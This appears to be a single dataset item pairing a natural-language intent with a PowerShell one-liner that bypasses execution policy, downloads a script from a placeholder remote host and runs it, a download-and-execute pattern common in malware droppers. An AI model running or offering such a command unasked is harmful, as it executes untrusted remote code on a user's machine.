# Natural language intent:
# Download and execute a PowerShell script from a remote URL.

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command "Invoke-WebRequest http://www.somewhere.com/hello.ps1 -OutFile hello.ps1; .\hello.ps1"
